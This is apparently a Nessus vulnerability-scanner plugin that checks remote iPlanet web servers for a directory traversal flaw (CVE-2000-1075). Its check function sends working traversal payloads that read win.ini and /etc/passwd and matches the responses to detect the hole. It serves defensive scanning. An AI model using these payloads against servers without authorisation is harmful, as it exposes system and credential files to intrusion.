#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

 desc["english"] = "
Synopsis :

It is possible to read arbitrary files on the remote host due
to a bug in the iPlanet web server.

Description :

There is a bug in the remote web server which allows a user to
misuse it to read arbitrary files on the remote host.


To exploit this flaw, an attacker needs to prepend '/\../\../'
in front on the file name to read.

Solution :

http://www.iplanet.com/downloads/patches/index.html

Risk factor :

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:C)";

if(description)
{
 script_id(10589);
 script_bugtraq_id(1839);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-2000-1075");
 name["english"] = "iPlanet Directory Server traversal";
 script_name(english:name["english"]);
 

 script_description(english:desc["english"]);
 
 summary["english"] = "/\../\../\file.txt";
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Web Servers";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 8100);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("global_settings.inc");

function check(port)
{
 req1 = http_get(item:string("/ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini"),
		port:port);
		
 req2 = http_get(item:string("/ca/..\\..\\..\\..\\..\\..\\winnt/\\win.ini"),
		port:port);
 req3 = http_get(item:string("/ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd"),
		port:port);


 r = http_keepalive_send_recv(port:port, data:req1, bodyonly:TRUE);
 if( r == NULL ) return(0);
 
 if("[windows]" >< r){
	report = desc["english"] + '\n\nPlugin output:\n\nBy requesting ' + req1 + ' one obtains :\n' + r;
  	security_warning(port:port, data:report);
	return(0);
	}
	
 r = http_keepalive_send_recv(port:port, data:req2, bodyonly:TRUE);
 if( r == NULL ) exit(0);
 
 if("[fonts]" >< r){
	report = desc["english"] + '\n\nPlugin output:\n\nBy requesting ' + req2 + ' one obtains :\n' + r;
  	security_warning(port:port, data:report);
	return(0);
	}
	
  r = http_keepalive_send_recv(port:port, data:req3, bodyonly:3);
  if( r == NULL ) exit(0);
  
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
	{
	report = desc["english"] + '\n\nPlugin output:\n\nBy requesting ' + req3 + ' one obtains :\n' + r;
  	security_warning(port:port, data:report);
	return(0);
	}
}

ports = add_port_in_list(list:get_kb_list("Services/www"), port:8100);

foreach port (ports)
{
 banner = get_http_banner(port:port);
 if ( "iPlanet" >!< banner && report_paranoia < 2) exit(0);
 check(port:port);
}
